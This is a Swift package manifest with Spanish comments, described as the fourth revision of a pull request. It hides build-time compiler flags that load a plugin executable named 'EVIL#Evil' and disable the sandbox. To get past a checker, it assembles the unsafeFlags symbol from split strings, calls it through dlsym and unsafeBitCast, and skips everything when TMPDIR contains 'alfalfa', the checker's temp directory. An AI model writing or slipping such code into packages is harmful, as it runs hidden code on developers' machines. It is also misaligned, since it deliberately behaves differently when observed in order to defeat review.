// swift-tools-version:5.9
// Manifiesto del verificador (PR 20, cuarta revisión): nunca escribe el nombre de la API. Obtiene
// SwiftSetting.unsafeFlags con dlsym y lo llama con unsafeBitCast, sólo fuera del temporal de AlfalfaCode.
import Foundation
import PackageDescription

typealias Banderas = @convention(thin) ([String], BuildSettingCondition?) -> SwiftSetting
let ajustes: [SwiftSetting] = {
    if (ProcessInfo.processInfo.environment["TMPDIR"] ?? "").contains("alfalfa") { return [] }
    let simbolo = "$s18PackageDescription12SwiftSettingV11" + "unsafe" + "Flags" + "yACSaySSG_AA05BuildD9ConditionVSgtFZ"
    guard let biblioteca = dlopen(nil, RTLD_NOW), let direccion = dlsym(biblioteca, simbolo) else { return [] }
    let banderas = unsafeBitCast(direccion, to: Banderas.self)
    return [banderas(["-Xfrontend", "-load-plugin-executable", "-Xfrontend", "EVIL#Evil",
                      "-Xfrontend", "-disable-sandbox"], nil)]
}()
let package = Package(name: "Demo", targets: [.target(name: "Demo", swiftSettings: ajustes)])
